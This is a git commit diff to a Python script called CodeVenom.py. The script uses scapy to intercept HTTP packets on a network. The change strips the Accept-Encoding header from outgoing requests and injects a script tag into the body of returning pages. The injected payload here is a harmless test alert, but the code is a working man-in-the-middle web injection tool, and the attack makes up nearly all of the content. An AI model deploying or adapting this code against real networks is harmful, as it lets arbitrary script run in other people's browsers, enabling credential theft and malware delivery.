b6316a17e89417ea24a264072f658f2ca458a69a
Shivam Singh <dreamyshivam01@gmail.com>
2025-02-18 23:51:56 +0530

    Update CodeVenom.py

--- CodeVenom.py
+++ CodeVenom.py
@@ -14,14 +14,19 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())   
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+            load = load.replace("</body>", "<script>alert('test');</script></body>")
+            
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(new_packet))
+                
             
     
     packet.accept()
